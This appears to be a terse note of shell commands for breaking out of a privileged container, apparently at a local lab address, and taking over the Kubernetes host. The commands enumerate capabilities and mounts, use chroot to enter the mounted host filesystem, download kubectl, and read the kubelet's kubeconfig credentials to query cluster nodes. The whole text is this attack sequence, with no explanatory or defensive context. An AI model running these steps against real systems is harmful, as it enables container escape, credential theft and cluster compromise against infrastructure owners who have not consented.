http://192.168.1.50:1233/

id
capsh --print
mount
ls /host-system/

chroot /host-system bash

docker ps
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"

cat /var/lib/kubelet/kubeconfig
kubectl --kubeconfig /var/lib/kubelet/kubeconfig get nodes



